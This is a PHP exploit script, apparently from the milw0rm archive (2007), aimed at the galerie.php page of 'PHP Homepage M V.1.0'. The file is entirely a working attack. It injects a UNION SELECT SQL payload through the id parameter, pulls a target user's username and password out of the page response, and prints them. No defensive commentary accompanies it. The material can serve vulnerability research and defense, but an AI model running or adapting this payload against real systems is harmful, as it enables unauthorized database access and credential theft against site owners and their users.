<?php
if ($argv[1] == '')
{
echo "--PHP Homepage M V.1.0 galerie.php Exploit----\n";
echo "only with magic_quotes_gpc OFF\n";
echo "by [PHCN] Mahjong\n";
echo "Usage : phpHPmv1.php http://127.0.0.1 / 1\n";
echo '----------------------------------------------';
}
else
{
$host = $argv[1];
$path = $argv[2];
$userid = $argv[3];

$data = $host.$path."galerie.php?act=show&id=99999'+UNION+SELECT+username,passwort,passwort,passwort+FROM+user+WHERE+U ID='$userid";
$data = file_get_contents($data);
$pw = substr($data,strpos($data,'<img border="0" src=\'bilder/')+28,30);
$pw = explode('.',$pw);
$pw = $pw[0];
$user = substr($data,strpos($data,'UID=\''.$userid.'\'<h1 align="center">',30));
$user = explode('>',$user);
$user = strrev($user[1]);
$user = substr($user,4,100);
$user = strrev($user);

echo "--EXPLOIT FINISHED--\n";
echo "userid : $userid\n";
echo "username: $user\n";
echo "password: $pw\n";
echo '--------------------';
}


?>

# milw0rm.com [2007-10-08]